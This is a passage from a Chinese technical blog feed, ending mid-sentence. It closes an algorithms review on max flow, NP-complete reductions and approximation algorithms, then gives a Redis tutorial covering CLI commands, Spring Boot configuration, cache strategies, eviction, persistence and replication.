$O(n(m+n)C_{m+n}^n)$；</p></li><li><p>单纯形算法求解多元线性规划；</p></li><li><p>最大流问题变式：</p><ul><li>含有多个源点和汇点的最大流问题：定义新的源点和汇点；</li><li>每个顶点有流量限制：将每个顶点拆成两个，这两个顶点间用一条有向边连接，容量就是限制。转换成普通最大流问题；</li><li>每条边在容量的基础上添加限制，要求流量不得低于某个限制。或者某些节点间存在流量损耗：直接规约成一般线性规划问题；</li></ul></li><li><p>瓶颈边（增大会导致总流增大）、临界边（减小会导致总流减小）：注意它们俩是不一样的！！</p></li><li><p>查找临界边：</p><ul><li><p>剩余图中只有反向边的；</p></li><li><p>但也不全是。可能某条在最大流中流满的边，其容量下降后，最大流中缺少的流量可以从其他边的流量得到补充。通过在剩余图中 DFS 能通过的这些反向边就不是临界边，排除它们即可。</p></li></ul></li><li><p>证明：二部图的最小顶点覆盖能够被规约为最大流问题。</p></li><li><p>边不相交问题（化归为最大流问题，需要证明）；</p></li><li><p>常见 NP-Complete 问题规约：</p><ul><li>稠密子图问题（a 个顶点中至少 b 条边）：$b=\dfrac{a(a-1)}{2}$，从最大团问题规约；</li><li>稀疏子图问题（a 个顶点中至多 b 条边）：$b = 0$，从最大独立集问题规约；</li><li>集合覆盖问题：从顶点覆盖规约（子问题，一个元素只会同时存在于两个集合中）；</li><li>子图同构问题（G 能否只通过删除一些点、边，修改名称来得到 H）：从哈密顿回路规约（构造图 G 是一个 N 元环，N 为输入图的顶点数）；</li><li>最大公共子图（同时删除 G 和 H 一些点和对应边，使二者相同，预算 b）：从最大独立集规约；</li><li>哈密顿回路、哈密顿道路相互规约；</li><li>最长初级路径（simple longest path）：从哈密顿路径规约；</li><li>K-Coloring 问题：从 3-SAT 问题规约（构建 OR-gadget 和 Clause gadget）；</li><li>可靠网络问题（shortest reliable path，给定顶点、距离矩阵(边权)、连接需求(重边数量)、预算，构建一个总代价不超过预算、两点间的不同路径数等于对应连接需求的图）：从 TSP 问题规约（预算 $b=n$，距离矩阵全为 1 或 2，表示有边和没有边，连接需求全为 2，表示在环上）；</li></ul></li><li><p>近似算法解决 NP 问题：</p><ul><li>贪婪算法求解集合覆盖问题。近似比 $ln n$；</li><li>极大匹配算法（贪婪选取尽可能多的 endpoints 的边，然后删除共享 endpoints 的边）求解顶点覆盖问题。近似比 2；</li><li>贪婪算法求解 k-clustering 问题：先任取一个点作为第一个中心，然后每次取离当前点最远的，中垂线分割。近似比为 2；</li><li>MST + skip 近似 metric-space-TSP 问题：近似大小不大于最小生成树长度两倍。而最优解不不小于最小生成树长度。因此近似比为 2；</li><li>rescale value 近似背包问题：缩小 $\hat{v_i}=\dfrac{n}{\varepsilon v_{\max}}$，总价值 $\sum v_i\ge\sum\hat{v_i}=K^\star(1-\varepsilon)$，即近似比为用户指定的任意接近；</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;&lt;p&gt;四则运算、$&#92;mathbf{Z}_N$ 下四则运算+幂运算复杂度；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;欧几里得 GCD 递归复杂度证明；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;拓展欧几里得算法求乘法逆元；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;利用同余性质推算大数</summary>
      
    
    
    
    <category term="review" scheme="https://blog.sjtuxhw.top/categories/review/"/>
    
    
    <category term="Programming" scheme="https://blog.sjtuxhw.top/tags/Programming/"/>
    
    <category term="Algorithms" scheme="https://blog.sjtuxhw.top/tags/Algorithms/"/>
    
  </entry>
  
  <entry>
    <title>Redis 入门：从实践到理论</title>
    <link href="https://blog.sjtuxhw.top/technical/redis-starter/"/>
    <id>https://blog.sjtuxhw.top/technical/redis-starter/</id>
    <published>2024-11-12T13:05:37.000Z</published>
    <updated>2024-11-14T13:13:31.049Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Chapter-1-基本概念和-CLI-使用"><a href="#Chapter-1-基本概念和-CLI-使用" class="headerlink" title="Chapter 1. 基本概念和 CLI 使用"></a>Chapter 1. 基本概念和 CLI 使用</h1><h2 id="1-1-NoSQL"><a href="#1-1-NoSQL" class="headerlink" title="1.1 NoSQL"></a>1.1 NoSQL</h2><p>用于存储非结构化数据，不保证 ACID 事务特性（仅有最终一致性 Weak Consistency Model）。</p><p>Redis（Remote Dictionary Server）就是一类基于内存的键值型 NoSQL，不保证数据一致性，但可以保证性能。</p><ul><li><p>一种 KVStore System，可以方便的存放非结构化数据，这对于缓存各异性数据非常有帮助；</p></li><li><p>Handle 网络请求多线程。处理指令单线程，单个指令具有原子性；</p></li><li>低延迟，利用 I/O Multiplexing 在单线程中处理多个请求；</li><li>支持数据持久化；</li><li>支持主从集群（从备份，读写分离）和分片集群（数据拆分，存储上限提高）；</li></ul><h2 id="1-2-Redis-Data-Structure"><a href="#1-2-Redis-Data-Structure" class="headerlink" title="1.2 Redis Data Structure"></a>1.2 Redis Data Structure</h2><p>Redis Key 一般使用 String，Value 支持：</p><ul><li>基本类型：<code>String</code>、<code>Hash</code>、<code>List</code>、<code>Set</code>、<code>SortedSet</code>；</li><li>特殊类型：<code>GEO</code>（地理位置信息格式）、<code>BitMap</code>（位图）、<code>HyperLog</code>；</li></ul><h2 id="1-3-Basic-Redis-CLI-Commands"><a href="#1-3-Basic-Redis-CLI-Commands" class="headerlink" title="1.3 Basic Redis CLI Commands"></a>1.3 Basic Redis CLI Commands</h2><h3 id="1-3-1-General"><a href="#1-3-1-General" class="headerlink" title="1.3.1 General"></a>1.3.1 General</h3><p>命令行指令较多，建议查询官方文档而不是背诵。介绍常见的几个（General）：</p><ul><li><code>KEYS &lt;pattern&gt;</code>：查询 Key 符合 pattern（R.E.）的键值对；</li><li><code>DEL/EXISTS &lt;KEY&gt;</code>：删除、判断存在性；</li><li><code>EXPIRE/TTL &lt;KEY&gt; [sec]</code>：设置/获取键值的有效期（<code>-1</code> 为永久、<code>-2</code> 为已过期）；</li></ul><h3 id="1-3-2-String-int-float"><a href="#1-3-2-String-int-float" class="headerlink" title="1.3.2 String (+int/float)"></a>1.3.2 String (+int/float)</h3><ul><li><code>SET/MSET &lt;KEY&gt; &lt;VAL&gt;[...(KEY, VAL)]</code>：设置/批量设置键值；</li><li><code>GET/MGET &lt;KEY&gt;[...KEY]</code>：获取/批量获取；</li><li><code>INCR/INCRBY &lt;KEY&gt; [STEP]</code>：让存储数值型 String 的 Value 自增 1 或 <code>STEP</code>；</li><li><code>INCRBYFLOAT &lt;KEY&gt; [incr]</code>：让存储浮点型 String 的 Value 增长指定值；</li><li><code>SETNX &lt;KEY&gt; &lt;VAL&gt;</code>：仅不存在才插入（决不更改已存在的数据）；</li><li><code>SETEX &lt;KEY&gt; &lt;sec&gt; &lt;VAL&gt;</code>：设置并指定有效期；</li></ul><h3 id="1-3-3-The-Hierarchy-Structure-of-Redis-Key"><a href="#1-3-3-The-Hierarchy-Structure-of-Redis-Key" class="headerlink" title="1.3.3 The Hierarchy Structure of Redis Key"></a>1.3.3 The Hierarchy Structure of Redis Key</h3><p>Redis Key 允许使用多个单词形成层级结构，常用格式为 <code>&lt;PROJECT_NAME&gt;:&lt;BUSSINESS_NAME&gt;:[TYPE]:&lt;id&gt;</code>；</p><h3 id="1-3-4-Hash"><a href="#1-3-4-Hash" class="headerlink" title="1.3.4 Hash"></a>1.3.4 Hash</h3><p>String 结构存储时，想要修改其中某个字段不方便。</p><p>现在引入 Hash 数据类型，其 <code>value</code> 作为一个无序字典（多了一层 field-value 关系），类似一个 <code>HashMap</code>；</p><ul><li><code>HSET/HGET &lt;KEY&gt; &lt;FIELD&gt; [VAL]</code></li><li><code>HMSET / HMGET</code></li><li><code>HGETALL &lt;KEY&gt;</code>：获取这个键的 value 中的所有 field 的值；</li><li><code>HKEYS</code>：获取这个键的所有 field；</li><li><code>HVALS</code>：获取这个键的所有 value；</li><li><code>HSETNX &lt;KEY&gt; &lt;sec&gt; &lt;FIELD&gt; &lt;VAL&gt;</code>：仅不存在才插入；</li></ul><h3 id="1-3-5-List"><a href="#1-3-5-List" class="headerlink" title="1.3.5 List"></a>1.3.5 List</h3><p>Redis 中的 value 类型为列表，与双向链表很相似（同时支持正向、反向索引）。特性：</p><ul><li>有序、可重复、增删操作快、查询速度一般；</li></ul><p>操作如下：</p><ul><li><code>LPUSH/RPUSH &lt;KEY&gt; &lt;ELEMENT&gt;[...ELEMENT]</code>：从列表左侧/右侧插入；</li><li><code>LPOP/RPOP &lt;KEY&gt;</code>：弹出；</li><li><code>LRANGE &lt;KEY&gt; &lt;START&gt; &lt;END&gt;</code>：获取列表中的角标范围中所有元素；</li><li><code>BLPOP / BRPOP &lt;KEY&gt;[...KEY] &lt;sec&gt;</code>：和 <code>LPOP/RPOP</code> 类似，但是在没有元素时等待一段时间，而不是直接返回 <code>NIL</code>；</li></ul><h3 id="1-3-6-Set"><a href="#1-3-6-Set" class="headerlink" title="1.3.6 Set"></a>1.3.6 Set</h3><p>Redis 中的 value 类型为集合，与 <code>HashSet</code> 类似。特性：</p><ul><li>无序、元素不可重复、查找快、支持交并差集操作；</li></ul><p>操作如下：</p><ul><li><code>SADD/SREM &lt;KEY&gt; &lt;MEMBER&gt;[...MEMBER]</code>；添加/移除集合中的若干元素；</li><li><code>SCARD &lt;KEY&gt;</code>：获取集合中元素个数；</li><li><code>SISMEMBER &lt;KEY&gt; &lt;MEMBER&gt;</code>：是否在集合内；</li><li><code>SMEMBERS &lt;KEY&gt;</code>：获取集合中所有元素；</li></ul><h3 id="1-3-7-SortedSet"><a href="#1-3-7-SortedSet" class="headerlink" title="1.3.7 SortedSet"></a>1.3.7 SortedSet</h3><p>Redis 中 value 类型为有序集，每个元素携带 <code>score</code> 值（相当于优先级），可以基于 <code>score</code> 排序。</p><p>其底层基于 SkipTable + HashTable 实现。特性如下：</p><ul><li>可排序、元素不重复、查询速度快；</li></ul><p>操作如下：</p><ul><li><code>ZADD &lt;KEY&gt; &lt;score&gt; &lt;MEMBER&gt;</code>：添加一个或多个元素到 sorted set，如果已经存在则更新 <code>score</code> 值；</li><li><code>ZREM &lt;KEY&gt; &lt;MEMBER&gt;</code>：移除一个指定元素；</li><li><code>ZSCORE/ZRANK &lt;KEY&gt; &lt;MEMBER&gt;</code>：获取指定元素 score 值 / 排名；</li><li><p><code>ZCARD &lt;KEY&gt;</code>：获取元素个数；</p></li><li><p><code>ZCOUNT/ZRANGEBYSCORE &lt;KEY&gt; &lt;MIN_SCORE&gt; &lt;MAX_SCORE&gt;</code>：统计 score 值在指定范围内的元素个数 / 元素值；</p></li><li><code>ZRANGE &lt;KEY&gt; &lt;MIN_RANK&gt; &lt;MAX_RANL&gt;</code>：获取指定排名区间内的元素；</li><li><code>ZDIFF / ZINTER / ZUNION</code>：求差集、交集、并集；</li></ul><h1 id="Chapter-2-Using-Redis-With-Spring-Boot"><a href="#Chapter-2-Using-Redis-With-Spring-Boot" class="headerlink" title="Chapter 2. Using Redis With Spring Boot"></a>Chapter 2. Using Redis With Spring Boot</h1><h2 id="2-1-Basic-Usages"><a href="#2-1-Basic-Usages" class="headerlink" title="2.1 Basic Usages"></a>2.1 Basic Usages</h2><p>引入 Redis Client for Java 的 Spring Boot 依赖：</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation <span class="string">&#x27;org.springframework.boot:spring-boot-starter-data-redis&#x27;</span></span><br><span class="line">    <span class="comment">// 连接池实现</span></span><br><span class="line">    implementation <span class="string">&#x27;org.apache.commons:commons-pool2&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置 Redis 连接信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">post:</span> <span class="string">...</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">...</span></span><br><span class="line">        <span class="comment"># 使用 lettuce 而非 jedis 实现</span></span><br><span class="line">        <span class="attr">lettuce:</span></span><br><span class="line">            <span class="attr">pool:</span></span><br><span class="line">                <span class="attr">max-active:</span> <span class="number">8</span><span class="comment"># 最大连接数</span></span><br><span class="line">                <span class="attr">max-idle:</span> <span class="number">8</span><span class="comment"># 最大空闲连接</span></span><br><span class="line">                <span class="attr">min-idle:</span> <span class="number">0</span><span class="comment"># 最小空闲连接</span></span><br><span class="line">                <span class="attr">max-wait:</span> <span class="string">100ms</span><span class="comment"># 最大连接等待时长</span></span><br></pre></td></tr></table></figure><p><strong>使用时自动装配 <code>RedisTemplate</code> 类型</strong>。</p><p>使用 <code>RedisTemplate</code> 的接口：</p><ul><li><p><code>RedisTemplate#opsForValue(Object key, Object val, [long timeout, TimeUnit unit])</code>：获取 Java 一般 Object 类型的操作，这个方法会将 <code>key, val</code> 全部序列化后存储。</p><blockquote><p>默认 <code>JdkSerializationRedisSerializer</code> 类型作为序列化器，底层使用 <code>ObjectOutputStream#writeObject</code>  完成序列化工作。</p><p>缺点：可读性差、默认序列化器的内存占用大（消息队列中的默认序列化器有同样问题）；</p><p>我们应该少用这种方法，尽量选择下面确定类型的方法。</p><p>还有一种方法是，自定义 Redis 的序列化方式。</p></blockquote></li><li><p><code>RedisTemplate#opsForXXX()</code>：返回 Spring Data Redis 对于指定数据类型 <code>XXX</code>（String/Hash/…）的可能操作集合 <code>XXXOperations</code>；</p></li></ul><p><code>XXXOperations</code> 类的对象可以完成对应类型的 <code>set / get</code> 等方法，并选用合适的序列化器进行存储处理。</p><h2 id="2-2-Self-defined-Serializer-for-Redis"><a href="#2-2-Self-defined-Serializer-for-Redis" class="headerlink" title="2.2 Self-defined Serializer for Redis"></a>2.2 Self-defined Serializer for Redis</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span> &#123;</span><br><span class="line">    <span class="comment">/* Create empty template */</span></span><br><span class="line">    RedisTemplate&lt;String, Object&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">/* Configure connection factory */</span></span><br><span class="line">    template.setConnectionFactory(redisConnectionFactory);</span><br><span class="line">    <span class="comment">/* Set Serializer for POJO */</span></span><br><span class="line">    <span class="type">GenericJackson2JsonRedisSerializer</span> <span class="variable">jsonRedisSerializer</span></span><br><span class="line">            <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>();</span><br><span class="line">    <span class="comment">/* Use String serializer for key &amp; hash key (instead of Jdk serializer) */</span></span><br><span class="line">    template.setKeySerializer(RedisSerializer.string());</span><br><span class="line">    template.setHashKeySerializer(RedisSerializer.string());</span><br><span class="line">    <span class="comment">/* Use JSON serializer for value &amp; hash value (instead of Jdk serializer) */</span></span><br><span class="line">    template.setValueSerializer(jsonRedisSerializer);</span><br><span class="line">    template.setHashValueSerializer(jsonRedisSerializer);</span><br><span class="line">    <span class="keyword">return</span> template;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有个问题，<code>GenericJackson2JsonRedisSerializer</code> 对一类数据会反复保存 <code>@class</code> 字段（反序列化后的类型）。这个信息虽然是必要的，但很多情况下存储 <code>@class</code> 字段甚至比原数据还要占空间！</p><p>因此我们一般不会直接使用 <code>JSON</code> 序列化器来序列化我们的 POJO，而是我们开发者<strong><u>对一个层级下的键都约定一个数据类型</u></strong>，然后使用 <strong><u>String 序列化器</u></strong>，最终手动序列化和反序列化，那么可以节省这部分空间。</p><p>Spring 中已经帮我们包装好了序列化、反序列化全是 String 的 <code>RedisTemplate</code>，省得我们配置了，它就是 <code>StringRedisTemplate</code>；</p><blockquote><p>也就是 <code>RedisTemplate&lt;String, Object&gt;</code>，并且设置好全部都是 String 的序列化、反序列化器；</p></blockquote><h1 id="Chapter-3-内存型数据库理论"><a href="#Chapter-3-内存型数据库理论" class="headerlink" title="Chapter 3. 内存型数据库理论"></a>Chapter 3. 内存型数据库理论</h1><p>本章介绍一下以 Redis 为首的 NoSQL 内存型数据库产生、发展的历程，同时介绍其存在的问题以及解决方案。</p><h2 id="3-1-为什么需要内存型数据库？"><a href="#3-1-为什么需要内存型数据库？" class="headerlink" title="3.1 为什么需要内存型数据库？"></a>3.1 为什么需要内存型数据库？</h2><p>持久化在磁盘上的关系型数据库在存储关系数据、处理事务的多数场合下都非常得力，但免不了存在一些问题。</p><p>例如，在电商、文章档案等网页应用中，常常是读请求远多于写请求，即便 MySQL 有 cache buffer pool（InnoDB），在大量数据查询的场合下也会出现频繁的 cache evict，究其原因就是 cache working space 太小了。</p><p>人们发现只是读请求造成的 Disk I/O 是可以避免的——通过将数据托管到一个更大的内存空间（这段内存空间可以不连续、甚至可以不在单个物理节点上，由一个程序来管理它）中缓存起来，可以有效提升这些应用的处理效率和吞吐量。</p><p>结论 1：<strong><u>在庞大数据量的应用场景下，读多写少、数据时间局部性强的应用访问模式可以通过外置的内存缓冲区统一进行缓存，来提升整体性能和接口承载量</u></strong>。这就是 Redis 要解决的需求痛点。</p><h2 id="3-2-缓存策略"><a href="#3-2-缓存策略" class="headerlink" title="3.2 缓存策略"></a>3.2 缓存策略</h2><p>在确定使用内存型数据库作为持久化的关系型数据库的缓存后，接下来，和所有缓存机制一样（不仅仅是数据库领域），内存型数据库会遇到两个问题：</p><ol><li>采取什么样的读/写缓存策略更好？</li><li>当缓冲区占满后，evict 的策略是什么？</li></ol><h3 id="3-2-1-缓存读写策略-和-缓存模式"><a href="#3-2-1-缓存读写策略-和-缓存模式" class="headerlink" title="3.2.1 缓存读写策略 和 缓存模式"></a>3.2.1 缓存读写策略 和 缓存模式</h3><p>对于第一个问题，区分缓存读策略和缓存写策略。</p><p><strong>缓存读策略</strong>：大多数情况下比较显然：</p><ul><li>如果 read cache miss，一定需要从磁盘上读数据，顺带写回缓存；</li><li>如果 read cache hit，则可以考虑记录数据热点情况；</li></ul><p><strong>缓存写策略</strong>：主要会有 4 类策略：</p><ul><li>如果 write cache hit，可以：<ul><li><strong>Write-through</strong>：立即将数据写入缓存（即覆盖当前行）并主动刷新（flush）到磁盘；</li><li><strong>Write-back</strong>：先把数据写入缓存，但不立即刷新，直到下一个数据要覆盖这个数据行的时候，才更新到磁盘中（defer write to disk until replacement of line，<strong>只是尽可能推迟了写入磁盘的时间</strong>）。另外，这个方案需要额外维护 dirty bit 来指示是否与磁盘数据一致；</li></ul></li><li>如果 write cache miss，可以：<ul><li><strong>Write-allocate</strong>：写分配，在 write-miss 后，<strong>先将原数据从磁盘读入缓存，转换为 write-hit 的情况，再 write-back（仅修改缓存 + dirty bit）</strong>；</li><li><strong>No-write-allocate</strong>：直接写入磁盘，不加载到缓存（缓存中没有这个数据所在的数据行，因为本来就是 write-miss）；</li></ul></li></ul><p>显然，在 write cache hit 情况下，write-through 和 write-back 策略的优劣势互补：前者保证内存和磁盘的数据较强的一致性，但是同步写回操作免不了降低了操作性能；后者接受了一定程度上的数据不一致性（推迟刷盘时间），换取了短时间内的高并发性能。</p><p>write-allocate 和 no-write-allocate 之间的优劣势和 write-through、write-back 的优劣势的对比相同，因此人们常常根据实际情况选择 “<strong>write-back + write-allocate</strong>” 或 “write-through + no-write-allocate” 的策略中的其中一对。</p><p>上述读写策略的不同选择，就形成了以 Redis 为首的内存数据库的 3 个主流的<strong><u>宏观缓存模式</u></strong>，每种模式可以应对一些使用场景：</p><ul><li><p>旁路缓存模式（Cache Aside Pattern）：同时维护数据库、缓存，二者中的数据存在强一致性；</p><ul><li><p>read：使用上面统一的缓存读策略；</p></li><li><p>write：不存在 write cache hit + no-write-allocate。立即写回数据库，并拒绝缓存。清空写这个数据的缓存信息（使用不缓存手段消除数据不一致性，<strong><u>注意保证顺序先更新磁盘再删除缓存</u></strong>）；</p><blockquote><p>为什么不采用上述的写缓存策略，而是拒绝缓存？因为考虑到<strong><u>多次盲写</u></strong>的问题。</p></blockquote></li></ul></li><li><p>读写穿透模式（Read/Write Through Pattern）：视缓存为主要存储手段，二者中的数据也存在强一致性；</p><ul><li>read：使用上面统一的读策略；</li><li>write：<strong>write-through + write-allocate</strong>；</li></ul></li><li><p>异步缓存写入模式（Write Behind Pattern）：针对读写穿透模式的改进，牺牲一部分数据一致性换取更高的吞吐量；</p><ul><li>read：使用上面统一的读策略；</li><li>write：write-back（优化，不使用 dirty-bit，而是异步更新到数据库）；</li></ul></li></ul><blockquote><p>后文将以如何实现读写穿透模式为例，展示代码，同时加入缓存击穿和缓存雪崩等等问题的应对措施。代码将在文末以附录形式呈现。</p></blockquote><p>结论 2：<strong><u>常用的缓存读写策略有很多种，不过依赖它们制定的缓存模式常见的有 3 种，分别是 旁路缓存、读写穿透、异步缓存</u></strong>；</p><h3 id="3-2-2-缓存-Evict-策略：以-Redis-为例"><a href="#3-2-2-缓存-Evict-策略：以-Redis-为例" class="headerlink" title="3.2.2 缓存 Evict 策略：以 Redis 为例"></a>3.2.2 缓存 Evict 策略：以 Redis 为例</h3><p>不同内存型数据库的缓存淘汰策略不尽相同。下面以 Redis 为例介绍它的 cache evict 方案：</p><p>首先，Redis 正常不会主动 evict 数据项，而是先通过数据过期的方式腾出内存空间：</p><ul><li>过期时间：对每个数据项可以设置 TTL（Time-To-Live），表示数据过期时间。过期的数据自动被清空；</li><li>定期清理：Redis 可以配置扫描过期数据的频率，扫描过程称为 Garbage Collection（GC）；</li><li>随机选取：由于 Redis 管理的缓冲区很大，因此每次 GC 一般不会扫描全表，而是随机选取一部分进行回收；</li><li>惰性删除：某些键值可能概率原因一直无法被选中删除，因此一旦有查询找到该数据，发现该数据过期后立即删除（被动）；</li></ul><p>在此基础上，如果：</p><ul><li>有些键值始终没被查询，且一直没有被随机选取清理（躲过了定期清理和惰性删除）；</li><li>过多的键值没有设置过期时间；</li><li>数据工作集（working set）进一步增大；</li></ul><p>导致内存空间还是没法及时腾出，那么 Redis 就会采取主动 evict 的方案。</p><p>Redis 主动进行 cache evict 时可以配置 8 种策略（注意，下面的策略都是 “没办法通过数据过期腾出空间” 的主动举措）：</p><ul><li><code>noneviction</code>：缓冲区占满后报错，不会删除任何键值；</li><li><code>allkeys-lru</code>：对所有缓存键使用 LRU 策略 evict；</li><li><code>volatile-lru</code>：从设置了过期时间的数据（不一定过期了）中使用 LRU 策略 evict；</li><li><code>allkeys/volatile-random</code>：对所有缓存键/设置了过期时间的缓存记录使用随机策略 evict；</li><li><code>volatile-ttl</code>：从设置过期时间的缓存记录中选择剩余存活时间最少的记录 evict；</li><li><code>allkeys/volatile-lfu</code>：从所有缓存键/设置了过期时间的缓存记录使用 LFU 策略 evict；</li></ul><blockquote><p>LRU:  Least Recently Used；</p><p>LFU:  Least Frequently Used；</p></blockquote><p>结论 3:   <strong><u>Redis 对于缓存使用率过高的解决方案是 数据过期 + 主动 evict。其中数据过期依赖 “定时清理” 和 “惰性删除”，主动 evict 依赖 8 种 evict 策略</u></strong>。</p><h2 id="3-3-缓存击穿-amp-缓存雪崩-Cache-Penetration-Avalanche"><a href="#3-3-缓存击穿-amp-缓存雪崩-Cache-Penetration-Avalanche" class="headerlink" title="3.3 缓存击穿 &amp; 缓存雪崩 Cache Penetration/Avalanche"></a>3.3 缓存击穿 &amp; 缓存雪崩 Cache Penetration/Avalanche</h2><p>注意到以上方案，从缓存读写策略、缓存模式，到缓存 evict 策略，全部都没有考虑到一个问题，或者说一类独特的访问 pattern：如果<strong><u>一直查询并不存在的数据</u></strong>会发生什么。</p><p>无论按照上面的哪种策略，都会频繁出现 “cache miss - 查找数据库 - 数据库未找到” 这个流程，这会频繁绕过缓存，增大数据库的 disk I/O，影响正常业务逻辑的时延和吞吐量，尤其是大量的 Client 查找一个并不存在的数据的时候，性能影响更为明显。这种现象被称为 “缓存击穿”。</p><p>为了解决缓存击穿的问题，可行的解决方案之一是：根据具体业务逻辑指定一个无效值（Invalid Value），一旦出现一次 read cache miss 并且发现数据库未找到的情况，可以在缓存中写入这个无效值，下次 read cache hit 就知道数据库中没有了。</p><blockquote><p>这种解决方案借鉴了 Bloom Filter 的设计思想。</p><p>Google 的一篇论文曾经介绍使用跳表 + Bloom Filter 为 Log-Structure Merged Tree 提升查询速度。</p></blockquote><p>但是，除了 “一直查询并不存在的数据”，还有一类情况会引发缓存击穿：<strong><u>某个热点数据过期被清理</u></strong>。</p><p>在过期后的短时间内，没有等上缓存恢复就出现大量的对该数据的并发请求。这些请求会 cache miss 并 fallback 到数据库，造成上述问题。</p><p>如果更严重一点，假设<strong><u>一批热点数据同时过期</u></strong>，也就是大批数据出现 cache miss，那么大量请求可能造成拒绝查询甚至宕机的后果，这种现象被称为 “缓存雪崩”。</p><p>解决这类缓存击穿，以及缓存雪崩的方案之一，无非是：</p><ul><li>延长热点数据的 TTL（比如每次访问时增加 TTL），或者热点数据永久驻留缓存；</li><li>批量设置缓存时，在一定时间范围内随机指定 TTL（例如 10~30 分钟内的均匀分布）；</li></ul><p>还有一种情况，如果 Redis 出现宕机，内存缓存数据全部丢失，也会出现缓存雪崩的问题，这个时候仅靠以上的应对方案已经不足以解决了。我们需要对 Redis 中的数据进行适当的持久化（“适当” 指同时保证性能）来尽量避免这个情况。</p><p>结论 4：<strong><u>“一直查询不存在的数据” 或者 “某个热点数据被清理” 都会造成缓存击穿、“一批热点数据同时过期”、“内存数据库宕机” 都可能造成缓存雪崩。对应的解决方案是 “添加无效值缓存”、“延长热点数据 TTL”、“随机化批量缓存 TTL”，以及 “适当的缓存持久化”</u></strong>。</p><h2 id="3-4-缓存持久化：以-Redis-为例"><a href="#3-4-缓存持久化：以-Redis-为例" class="headerlink" title="3.4 缓存持久化：以 Redis 为例"></a>3.4 缓存持久化：以 Redis 为例</h2><p>基于上述原因，我们需要对内存型数据库进行适当的缓存持久化。我们仍然以 Redis 为例说明。</p><p>Redis 提供了一套缓存持久化方案：RDB；</p><p>首先 RDB 支持全量备份，但是如果 Redis 缓存空间很大，一次全量备份刷盘会耗时很久，虽说 NoSQL 不需要支持完整的 ACID 性质，但也会严重影响查询时延和吞吐量，并且可能出现持久化的数据不一致的情况。也就是说：</p><ul><li>RDB 即便支持全量备份也不能太过频繁，对性能影响较大；</li><li>RDB 以分钟级别进行全量备份，可能短时间内会丢失大量新数据（snapshot 数据不一致）；</li></ul><p>因此 RDB 全量备份在多数场合下是不划算的。</p><p>于是人们借鉴了关系型数据库的 Binary Log 的思想，添加了一种 AOF 机制，采用<strong><u>增量备份</u></strong>来备份缓存数据。</p><p><strong><u>AOF 持久化机制</u></strong>（Append Only File），就是一种<strong>增量逻辑备份</strong>，向日志文件中以二进制形式写入修改缓存的指令，并且使用了 AOF Buffer 来批量写入以提升效率。</p><p>我们注意到 AOF Log 随着时间推移也会越来越大、越来越多，加载和存储效率都不高。一种解决方案是，定时对已有的 AOF Log 进行重写压缩（包括删去无效修改、指令重写等等）和轮替。</p><p>此外，为了解决备份时数据不一致现象，Redis 再引入 AOF Rewrite Buffer，可以存放在备份期间修改的数据指令，以便子进程对 AOF Log 重写时加入最新的、遗漏的修改指令，维持了一些数据一致性。</p><p>结论 5:   <strong><u>Redis 提供了 RDB 全量备份和 AOF 增量备份两种缓存持久化方案，和关系型数据库一样，二者配合使用可以一定程度上解决缓存热身和雪崩问题</u></strong>。</p><p>虽然缓存持久化能一定程度上解决缓存雪崩、缓存热身等问题，但是无法提升 Redis 的可用性（availability）。为了实现高可用，我们需要引入 Redis 集群，利用多个物理节点 primary-backup 的方式实现高可用支持。</p><h2 id="3-5-内存数据库副本-与-高可用支持"><a href="#3-5-内存数据库副本-与-高可用支持" class="headerlink" title="3.5 内存数据库副本 与 高可用支持"></a>3.5 内存数据库副本 与 高可用支持</h2><p>一个经典的架构：primary-backup 架构（旧称 “master-slave” 主从架构），可以作为数据 replicas 的模式，在多种分布式系统上都在使用。</p><p>例如，我们可以对 Redis 采用这种架构策略。一个 Redis 节点作为 primary，其他两个 redis 作为 backup server；</p><p>其中：</p><ul><li>primary 负责统一写操作，再利用类似 RSM（Replicated State Machine）之类的机制向 backup 发送数据 / 以指令传播的形式同步数据的修改；</li><li><p>primary 和 backup server 都可以处理读操作，有助于减小 primary 负担。</p></li><li><p>primary 维护 Write Ahead Log，在 backup 宕机时能够从 primary 的 WAL 以及自身的 Log 中迅速恢复；</p></li></ul><p>如果考虑到 primary 也可能宕机，可以引入分布式协调者（coordinator），决定谁作为 primary。</p><blockquote><p>这个协调者在 Redis 的术语中被称为 <strong>“哨兵”（Sentinel）</strong>。</p></blockquote><p>另外，如果还需要保证 coordinator 自身的高可用，可以对 coordinator 进行 replications，可以构建经典 